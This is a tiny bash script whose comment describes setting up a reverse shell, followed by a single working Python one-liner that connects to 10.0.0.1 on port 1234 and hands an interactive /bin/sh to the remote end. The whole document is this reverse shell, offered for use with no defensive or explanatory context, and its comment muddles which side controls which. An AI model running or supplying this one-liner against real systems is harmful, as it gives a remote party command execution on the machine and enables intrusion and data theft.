#!/bin/bash
# Sets up your own system as a server for a
# client to log in to but the connection acts as 
# a reverse shell allowing the server to issue
# commands to the client system.

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
